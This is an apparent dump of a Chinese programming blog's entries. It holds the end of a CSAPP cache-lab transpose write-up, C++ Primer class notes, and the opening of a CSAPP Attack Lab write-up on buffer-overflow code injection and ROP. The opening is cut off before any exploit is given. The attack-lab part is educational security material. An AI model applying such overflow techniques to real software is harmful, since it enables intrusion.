&#123;</span><br><span class="line">            <span class="comment">// 处理第4块</span></span><br><span class="line">            a_4 = A[k][j + <span class="number">4</span>];</span><br><span class="line">            a_5 = A[k][j + <span class="number">5</span>];</span><br><span class="line">            a_6 = A[k][j + <span class="number">6</span>];</span><br><span class="line">            a_7 = A[k][j + <span class="number">7</span>];</span><br><span class="line">            B[j + <span class="number">4</span>][k] = a_4;</span><br><span class="line">            B[j + <span class="number">5</span>][k] = a_5;</span><br><span class="line">            B[j + <span class="number">6</span>][k] = a_6;</span><br><span class="line">            B[j + <span class="number">7</span>][k] = a_7;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(cling) ➜  l4_cachelab ./test-trans -M 64 -N 64</span><br><span class="line"></span><br><span class="line">Function 0 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:9017, misses:1228, evictions:1196</span><br></pre></td></tr></table></figure><h3 id="两个缓冲区写法（高效）">两个缓冲区写法（高效）</h3><p>同样保持分块为 <code>8 x 8</code>，在大的分块下再分成 4 个 <code>4 x 4</code> 的小分块。我们先将 <code>A</code> 的前四行全部复制到 <code>B</code> 的前四行，这个时候 <code>B</code> 的左上角的元素在最终正确的位置，<code>B</code> 的右上角元素是应该放到左下角的元素。然后，我们在复制后 <code>A</code> 的后四行到 <code>B</code> 的过程中，利用本地变量将 <code>B</code> 右上角的内容复制到左下角。</p><p>具体步骤如下：</p><p><img src="/2023/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l4-cachelab/image-20231004152312397.png" alt></p><ol><li>先将 <code>A</code> 的前四行按照 (1) 复制到 <code>B</code> 中。</li><li>按照 (2) 将 <code>A</code> 中对应位置的元素存到本地变量中。</li><li><code>buf1</code> 的四个元素与 <code>B</code> 右上角的第一行交换，将 <code>buf2</code> 中的值存到 <code>B</code> 右下角的对应位置。此时缓存中 <code>B[4]</code> 替换 <code>B[0]</code>。</li><li>将 <code>buf1</code> 中的元素存放到 <code>B</code> 左下角对应位置。</li><li>改变 8×8 块的位置，重复 (2)，(3)，(4)，直到所有元素到达正确位置。</li></ol><blockquote><p>可以看到，这种方法与上一种方法的本质上是完全一样的。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> block_size = <span class="number">8</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i += block_size) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; M; j += block_size) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; block_size / <span class="number">2</span>; ++k) &#123;</span><br><span class="line">            <span class="comment">// A top left</span></span><br><span class="line">            a0 = A[k + i][j];</span><br><span class="line">            a1 = A[k + i][j + <span class="number">1</span>];</span><br><span class="line">            a2 = A[k + i][j + <span class="number">2</span>];</span><br><span class="line">            a3 = A[k + i][j + <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// copy</span></span><br><span class="line">            <span class="comment">// A top right</span></span><br><span class="line">            a4 = A[k + i][j + <span class="number">4</span>];</span><br><span class="line">            a5 = A[k + i][j + <span class="number">5</span>];</span><br><span class="line">            a6 = A[k + i][j + <span class="number">6</span>];</span><br><span class="line">            a7 = A[k + i][j + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// B top left</span></span><br><span class="line">            B[j][k + i] = a0;</span><br><span class="line">            B[j + <span class="number">1</span>][k + i] = a1;</span><br><span class="line">            B[j + <span class="number">2</span>][k + i] = a2;</span><br><span class="line">            B[j + <span class="number">3</span>][k + i] = a3;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// copy</span></span><br><span class="line">            <span class="comment">// B top right</span></span><br><span class="line">            B[j + <span class="number">0</span>][k + <span class="number">4</span> + i] = a4;</span><br><span class="line">            B[j + <span class="number">1</span>][k + <span class="number">4</span> + i] = a5;</span><br><span class="line">            B[j + <span class="number">2</span>][k + <span class="number">4</span> + i] = a6;</span><br><span class="line">            B[j + <span class="number">3</span>][k + <span class="number">4</span> + i] = a7;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; block_size / <span class="number">2</span>; k++) &#123;</span><br><span class="line">            <span class="comment">// step 1 2</span></span><br><span class="line">            a0 = A[i + <span class="number">4</span>][j + k], a4 = A[i + <span class="number">4</span>][j + k + <span class="number">4</span>];</span><br><span class="line">            a1 = A[i + <span class="number">5</span>][j + k], a5 = A[i + <span class="number">5</span>][j + k + <span class="number">4</span>];</span><br><span class="line">            a2 = A[i + <span class="number">6</span>][j + k], a6 = A[i + <span class="number">6</span>][j + k + <span class="number">4</span>];</span><br><span class="line">            a3 = A[i + <span class="number">7</span>][j + k], a7 = A[i + <span class="number">7</span>][j + k + <span class="number">4</span>];</span><br><span class="line">            <span class="comment">// step 3</span></span><br><span class="line">            tmp = B[j + k][i + <span class="number">4</span>], B[j + k][i + <span class="number">4</span>] = a0, a0 = tmp;</span><br><span class="line">            tmp = B[j + k][i + <span class="number">5</span>], B[j + k][i + <span class="number">5</span>] = a1, a1 = tmp;</span><br><span class="line">            tmp = B[j + k][i + <span class="number">6</span>], B[j + k][i + <span class="number">6</span>] = a2, a2 = tmp;</span><br><span class="line">            tmp = B[j + k][i + <span class="number">7</span>], B[j + k][i + <span class="number">7</span>] = a3, a3 = tmp;</span><br><span class="line">            <span class="comment">// step 4</span></span><br><span class="line">            B[j + k + <span class="number">4</span>][i + <span class="number">0</span>] = a0, B[j + k + <span class="number">4</span>][i + <span class="number">4</span> + <span class="number">0</span>] = a4;</span><br><span class="line">            B[j + k + <span class="number">4</span>][i + <span class="number">1</span>] = a1, B[j + k + <span class="number">4</span>][i + <span class="number">4</span> + <span class="number">1</span>] = a5;</span><br><span class="line">            B[j + k + <span class="number">4</span>][i + <span class="number">2</span>] = a2, B[j + k + <span class="number">4</span>][i + <span class="number">4</span> + <span class="number">2</span>] = a6;</span><br><span class="line">            B[j + k + <span class="number">4</span>][i + <span class="number">3</span>] = a3, B[j + k + <span class="number">4</span>][i + <span class="number">4</span> + <span class="number">3</span>] = a7;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(cling) ➜  l4_cachelab ./test-trans -M 64 -N 64</span><br><span class="line"></span><br><span class="line">Function 0 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:9137, misses:1108, evictions:1076</span><br></pre></td></tr></table></figure><p><strong>结果分析</strong></p><p>这个实现会完全消除行同一个矩阵内部的冲突，但是两个矩阵之间的冲突没能完全避免。</p><p>对于在对角线上的块，步骤 (1) 会有 3 次额外 miss，步骤 (2)、(3)、(4)、(5) 有 7 次额外 miss。普通块 miss 次数仍然为 8。理论上总的 miss 次数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>3</mn><mo>+</mo><mn>7</mn><mo stretchy="false">)</mo><mo>×</mo><mn>8</mn><mo>+</mo><mn>64</mn><mo>×</mo><mn>8</mn><mo>×</mo><mn>2</mn><mo>=</mo><mn>1104</mn></mrow><annotation encoding="application/x-tex">(3+7)\times 8 + 64\times 8\times 2=1104</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">7</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">64</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1104</span></span></span></span>。</p><p>步骤（1）中的三次 miss 可以通过先复制后转置的思路消除。</p><h2 id="61×67">61×67</h2><p>这个矩阵的转置要求很松，<code>miss</code>为 2000 以下就可以了。我也无心进行更深入的优化，直接 8 × 8 的分块就能通过。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">8</span> &lt;= N &amp;&amp; j + <span class="number">8</span> &lt;= M) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> s = j; s &lt; j + <span class="number">8</span>; s++) &#123;</span><br><span class="line">                a0 = A[i][s];</span><br><span class="line">                a1 = A[i + <span class="number">1</span>][s];</span><br><span class="line">                a2 = A[i + <span class="number">2</span>][s];</span><br><span class="line">                a3 = A[i + <span class="number">3</span>][s];</span><br><span class="line">                a4 = A[i + <span class="number">4</span>][s];</span><br><span class="line">                a5 = A[i + <span class="number">5</span>][s];</span><br><span class="line">                a6 = A[i + <span class="number">6</span>][s];</span><br><span class="line">                a7 = A[i + <span class="number">7</span>][s];</span><br><span class="line">                B[s][i + <span class="number">0</span>] = a0;</span><br><span class="line">                B[s][i + <span class="number">1</span>] = a1;</span><br><span class="line">                B[s][i + <span class="number">2</span>] = a2;</span><br><span class="line">                B[s][i + <span class="number">3</span>] = a3;</span><br><span class="line">                B[s][i + <span class="number">4</span>] = a4;</span><br><span class="line">                B[s][i + <span class="number">5</span>] = a5;</span><br><span class="line">                B[s][i + <span class="number">6</span>] = a6;</span><br><span class="line">                B[s][i + <span class="number">7</span>] = a7;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; min(i + <span class="number">8</span>, N); k++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> s = j; s &lt; min(j + <span class="number">8</span>, M); s++) &#123;</span><br><span class="line">                    B[s][k] = A[k][s];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(cling) ➜  l4_cachelab ./test-trans -M 61 -N 67</span><br><span class="line"></span><br><span class="line">Function 0 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:6315, misses:1864, evictions:1832</span><br></pre></td></tr></table></figure><h1 id="参考资料">参考资料</h1><ul><li><p><a href="https://yangtau.me/posts/2019-08-21-csapp-cache.html">https://yangtau.me/posts/2019-08-21-csapp-cache.html</a></p></li><li><p>Introduction to CSAPP（二十一）：这可能是你能找到的最详细的cachelab了 - Yannick的文章 - 知乎 <a href="https://zhuanlan.zhihu.com/p/138881600">https://zhuanlan.zhihu.com/p/138881600</a></p></li><li><p><a href="https://deconx.cn/docs/system/CSAPP/Lab05-Cache_Lab">https://deconx.cn/docs/system/CSAPP/Lab05-Cache_Lab</a></p></li><li><p>【【深入理解计算机系统 实验3 CSAPP】cache lab 缓存实现 CMU cachelab】 <a href="https://www.bilibili.com/video/BV1PF411Y7NM/?share_source=copy_web&amp;vd_source=1e8c177289cfed3be80e766714c3f11f">https://www.bilibili.com/video/BV1PF411Y7NM/?share_source=copy_web&amp;vd_source=1e8c177289cfed3be80e766714c3f11f</a></p></li><li><p><a href="https://www.cnblogs.com/zhiyiYo/p/16284866.html">https://www.cnblogs.com/zhiyiYo/p/16284866.html</a></p></li><li><p>CSAPP - Cache Lab的更(最)优秀的解法 - NFLS-CHINA的文章 - 知乎<br><a href="https://zhuanlan.zhihu.com/p/387662272">https://zhuanlan.zhihu.com/p/387662272</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第7章 类</title>
      <link href="/2023/08/27/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch07/"/>
      <url>/2023/08/27/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch07/</url>
      
        <content type="html"><![CDATA[<h2 id="定义抽象数据类型">定义抽象数据类型</h2><ul><li><strong>类背后的基本思想</strong>：<strong>数据抽象</strong>（data abstraction）和<strong>封装</strong>（encapsulation）。</li><li>数据抽象是一种依赖于<strong>接口</strong>（interface）和<strong>实现</strong>（implementation）分离的编程技术。</li><li>接口包括用户所能执行的操作；实现包括类的数据成员、负责接口实现的函数体以及定义类所需的各种私有函数。</li></ul><h3 id="类成员-（Member）">类成员 （Member）</h3><ul><li>必须在类的内部声明，不能在其他地方增加成员。</li><li>成员可以是数据，函数，类型别名。</li></ul><h3 id="类的成员函数">类的成员函数</h3><ul><li>成员函数的<strong>声明</strong>必须在类的内部。</li><li>成员函数的<strong>定义</strong>既可以在类的内部也可以在外部。</li><li>使用点运算符 <code>.</code> 调用成员函数。</li><li>必须对任何<code>const</code>或引用类型成员以及没有默认构造函数的类类型的任何成员使用初始化式。</li><li><code>ConstRef::ConstRef(int ii): i(ii), ci(i), ri(ii) &#123; &#125;</code></li><li>默认实参： <code>Sales_item(const std::string &amp;book): isbn(book), units_sold(0), revenue(0.0) &#123; &#125;</code></li><li><code>*this</code>：<ul><li>每个成员函数都有一个额外的，隐含的形参<code>this</code>。</li><li><code>this</code>总是指向当前对象，因此<code>this</code>是一个常量指针。</li><li>形参表后面的<code>const</code>，改变了隐含的<code>this</code>形参的类型，如 <code>bool same_isbn(const Sales_item &amp;rhs) const</code>，这种函数称为“常量成员函数”（<code>this</code>指向的当前对象是常量）。</li><li><code>return *this;</code>可以让成员函数连续调用。</li><li>普通的非<code>const</code>成员函数：<code>this</code>是指向类类型的<code>const</code>指针（可以改变<code>this</code>所指向的值，不能改变<code>this</code>保存的地址——顶层const）。</li><li><code>const</code>成员函数：<code>this</code>是指向const类类型的<code>const</code>指针（既不能改变<code>this</code>所指向的值，也不能改变<code>this</code>保存的地址）。</li></ul></li></ul><h3 id="非成员函数">非成员函数</h3><ul><li>和类相关的非成员函数，定义和声明都应该在类的外部。</li></ul><h3 id="类的构造函数">类的构造函数</h3><ul><li>类通过一个或者几个特殊的成员函数来控制其对象的初始化过程，这些函数叫做<strong>构造函数</strong>。</li><li>构造函数是特殊的成员函数。</li><li>构造函数放在类的<code>public</code>部分。</li><li>与类同名的成员函数。</li><li><code>Sales_item(): units_sold(0), revenue(0.0) &#123; &#125;</code></li><li><code>=default</code>要求编译器合成默认的构造函数。(<code>C++11</code>)</li><li>初始化列表：冒号和花括号之间的代码： <code>Sales_item(): units_sold(0), revenue(0.0) &#123; &#125;</code></li></ul><h2 id="访问控制与封装">访问控制与封装</h2><ul><li><strong>访问说明符</strong>（access specifiers）：<ul><li><code>public</code>：定义在 <code>public</code>后面的成员在整个程序内可以被访问； <code>public</code>成员定义类的接口。</li><li><code>private</code>：定义在 <code>private</code>后面的成员可以被类的成员函数访问，但不能被使用该类的代码访问； <code>private</code>隐藏了类的实现细节。</li></ul></li><li>使用 <code>class</code>或者 <code>struct</code>：都可以被用于定义一个类。唯一的却别在于访问权限。<ul><li>使用 <code>class</code>：在第一个访问说明符之前的成员是 <code>priavte</code>的。</li><li>使用 <code>struct</code>：在第一个访问说明符之前的成员是 <code>public</code>的。</li></ul></li></ul><h3 id="友元">友元</h3><ul><li>允许特定的<strong>非成员函数</strong>访问一个类的<strong>私有成员</strong>.</li><li>友元的声明以关键字 <code>friend</code>开始。 <code>friend Sales_data add(const Sales_data&amp;, const Sales_data&amp;);</code>表示非成员函数<code>add</code>可以访问类的非公有成员。</li><li>通常将友元声明成组地放在<strong>类定义的开始或者结尾</strong>。</li><li>类之间的友元：<ul><li>如果一个类指定了友元类，则友元类的成员函数可以访问此类包括非公有成员在内的所有成员。</li></ul></li></ul><h3 id="封装的益处">封装的益处</h3><ul><li>确保用户的代码不会无意间破坏封装对象的状态。</li><li>被封装的类的具体实现细节可以随时改变，而无需调整用户级别的代码。</li></ul><h2 id="类的其他特性">类的其他特性</h2><ul><li>成员函数作为内联函数 <code>inline</code>：<ul><li>在类的内部，常有一些规模较小的函数适合于被声明成内联函数。</li><li><strong>定义</strong>在类内部的函数是<strong>自动内联</strong>的。</li><li>在类外部定义的成员函数，也可以在声明时显式地加上 <code>inline</code>。</li></ul></li><li><strong>可变数据成员</strong> （mutable data member）：<ul><li><code>mutable size_t access_ctr;</code></li><li>永远不会是<code>const</code>，即使它是<code>const</code>对象的成员。</li></ul></li><li><strong>类类型</strong>：<ul><li>每个类定义了唯一的类型。</li></ul></li></ul><h2 id="类的作用域">类的作用域</h2><ul><li>每个类都会定义它自己的作用域。在类的作用域之外，普通的数据和函数成员只能由引用、对象、指针使用成员访问运算符来访问。</li><li>函数的<strong>返回类型</strong>通常在函数名前面，因此当成员函数定义在类的外部时，返回类型中使用的名字都位于类的作用域之外。</li><li>如果成员使用了外层作用域中的某个名字，而该名字代表一种<strong>类型</strong>，则类不能在之后重新定义该名字。</li><li>类中的<strong>类型名定义</strong>都要放在一开始。</li></ul><h2 id="构造函数再探">构造函数再探</h2><ul><li>构造函数初始值列表：<ul><li>类似<code>python</code>使用赋值的方式有时候不行，比如<code>const</code>或者引用类型的数据，只能初始化，不能赋值。（注意初始化和赋值的区别）</li><li>最好让构造函数初始值的顺序和成员声明的顺序保持一致。</li><li>如果一个构造函数为所有参数都提供了默认参数，那么它实际上也定义了默认的构造函数。</li></ul></li></ul><h3 id="委托构造函数-（delegating-constructor-C-11）">委托构造函数 （delegating constructor, <code>C++11</code>）</h3><ul><li>委托构造函数将自己的职责委托给了其他构造函数。</li><li><code>Sale_data(): Sale_data(&quot;&quot;, 0, 0) &#123;&#125;</code></li></ul><h3 id="隐式的类型转换">隐式的类型转换</h3><ul><li>如果构造函数<strong>只接受一个实参</strong>，则它实际上定义了转换为此类类型的<strong>隐式转换机制</strong>。这种构造函数又叫<strong>转换构造函数</strong>（converting constructor）。</li><li>编译器只会自动地执行<code>仅一步</code>类型转换。</li><li>抑制构造函数定义的隐式转换：<ul><li>将构造函数声明为<code>explicit</code>加以阻止。</li><li><code>explicit</code>构造函数只能用于直接初始化，不能用于拷贝形式的初始化。</li></ul></li></ul><h3 id="聚合类-（aggregate-class）">聚合类 （aggregate class）</h3><ul><li>满足以下所有条件：<ul><li>所有成员都是<code>public</code>的。</li><li>没有定义任何构造函数。</li><li>没有类内初始值。</li><li>没有基类，也没有<code>virtual</code>函数。</li></ul></li><li>可以使用一个花括号括起来的成员初始值列表，初始值的顺序必须和声明的顺序一致。</li></ul><h3 id="字面值常量类">字面值常量类</h3><ul><li><code>constexpr</code>函数的参数和返回值必须是字面值。</li><li><strong>字面值类型</strong>：除了算术类型、引用和指针外，某些类也是字面值类型。</li><li>数据成员都是字面值类型的聚合类是字面值常量类。</li><li>如果不是聚合类，则必须满足下面所有条件：<ul><li>数据成员都必须是字面值类型。</li><li>类必须至少含有一个<code>constexpr</code>构造函数。</li><li>如果一个数据成员含有类内部初始值，则内置类型成员的初始值必须是一条常量表达式；或者如果成员属于某种类类型，则初始值必须使用成员自己的<code>constexpr</code>构造函数。</li><li>类必须使用析构函数的默认定义，该成员负责销毁类的对象。</li></ul></li></ul><h2 id="类的静态成员">类的静态成员</h2><ul><li>非<code>static</code>数据成员存在于类类型的每个对象中。</li><li><code>static</code>数据成员独立于该类的任意对象而存在。</li><li>每个<code>static</code>数据成员是与类关联的对象，并不与该类的对象相关联。</li><li>声明：<ul><li>声明之前加上关键词<code>static</code>。</li></ul></li><li>使用：<ul><li>使用<strong>作用域运算符</strong><code>::</code>直接访问静态成员:<code>r = Account::rate();</code></li><li>也可以使用对象访问：<code>r = ac.rate();</code></li></ul></li><li>定义：<ul><li>在类外部定义时不用加<code>static</code>。</li></ul></li><li>初始化：<ul><li>通常不在类的内部初始化，而是在定义时进行初始化，如 <code>double Account::interestRate = initRate();</code></li><li>如果一定要在类内部定义，则要求必须是字面值常量类型的<code>constexpr</code>。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 《C++ Primer 5th》 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP - Attack Lab详解</title>
      <link href="/2023/06/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l3-attacklab/"/>
      <url>/2023/06/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l3-attacklab/</url>
      
        <content type="html"><![CDATA[<p><em><a href="http://csapp.cs.cmu.edu/im/labs/attacklab.tar">Attack Lab</a></em> <em><strong>[Updated 1/11/16]</strong></em> (<a href="http://csapp.cs.cmu.edu/3e/README-attacklab">README</a>, <a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">Writeup</a>, <a href="http://csapp.cs.cmu.edu/3e/attacklab-release.html">Release Notes</a>, <a href="http://csapp.cs.cmu.edu/3e/target1.tar">Self-Study Handout</a>)</p><blockquote><p><em>Note: This is the 64-bit successor to the 32-bit Buffer Lab.</em> Students are given a pair of unique custom-generated x86-64 binary executables, called <em>targets</em>, that have buffer overflow bugs. One target is vulnerable to code injection attacks. The other is vulnerable to return-oriented programming attacks. Students are asked to modify the behavior of the targets by developing exploits based on either code injection or return-oriented programming. This lab teaches the students about the stack discipline and teaches them about the danger of writing code that is vulnerable to buffer overflow attacks.</p><p>If you’re a self-study student, here are a pair of <a href="http://csapp.cs.cmu.edu/3e/target1.tar">Ubuntu 12.4 targets</a> that you can try out for yourself. You’ll need to run your targets using the <strong>“-q”</strong> option so that they don’t try to contact a non-existent grading server. If you’re an instructor with a CS:APP acount, you can download the solutions <a href="https://csapp.cs.cmu.edu/im/labs/target1-sol.tar">here</a>.</p></blockquote><p>实验作业网址：<a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p><h1 id="前言">前言</h1><h2 id="实验目的">实验目的</h2><p>利用缓冲区溢出错误进行代码注入攻击和 ROP 攻击。实验提供了以下几个文件，其中：</p><ul><li><code>ctarget</code> 可执行文件用来进行代码注入攻击。</li><li><code>rtarget</code> 用来进行 ROP 攻击。</li></ul><p>由于<code>README.txt</code>文件中有效信息有效，为完成本实验，<strong>非常有必要</strong>阅读<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">Writeup</a>，其中不仅包括各个phase需要完成的工作，还介绍了hex2raw的使用教程，和使用gcc以及objdump生成待注入汇编代码的机器码。</p><table><thead><tr><th style="text-align:center">阶段</th><th style="text-align:center">程序</th><th style="text-align:center">等级</th><th style="text-align:center">攻击方法</th><th style="text-align:center">函数</th><th style="text-align:center">分值</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">ctarget</td><td style="text-align:center">1</td><td style="text-align:center">CI</td><td style="text-align:center">touch1</td><td style="text-align:center">10</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">ctarget</td><td style="text-align:center">2</td><td style="text-align:center">CI</td><td style="text-align:center">touch2</td><td style="text-align:center">25</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">ctarget</td><td style="text-align:center">3</td><td style="text-align:center">CI</td><td style="text-align:center">touch3</td><td style="text-align:center">25</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">rtarget</td><td style="text-align:center">2</td><td style="text-align:center">ROP</td><td style="text-align:center">touch2</td><td style="text-align:center">35</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">rtarget</td><td style="text-align:center">3</td><td style="text-align:center">ROP</td><td style="text-align:center">touch3</td><td style="text-align:center">5</td></tr></tbody></table><ul><li>CI: Code injection</li><li>ROP: Return-oriented programming</li></ul><h2 id="实验环境">实验环境</h2><p>经过本人测试，在WSL2和VMware中的Ubuntu22.04无法进行本实验，而Debain可以完整进行本实验。Ubuntu22.04运行<code>ctarget</code>结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(base) ➜  l3_attacklab ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Ouch!: You caused a segmentation fault!</span><br><span class="line">Better luck next time</span><br><span class="line">FAIL: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:FAIL:0xffffffff:ctarget:0:</span><br></pre></td></tr></table></figure><h1 id="代码注入攻击">代码注入攻击</h1><p>首先使用 <code>checksec</code>（pwndbg提供checksec插件）查看可执行文件和内核属性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/home/jkup/target1/ctarget&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><blockquote><p>💡 Linux保护机制：<a href="https://lantern.cool/note-pwn-linux-protect/index.html">https://lantern.cool/note-pwn-linux-protect/index.html</a></p></blockquote><h2 id="Level-1">Level 1</h2><p>在 <code>ctarget</code> 中，<code>test</code> 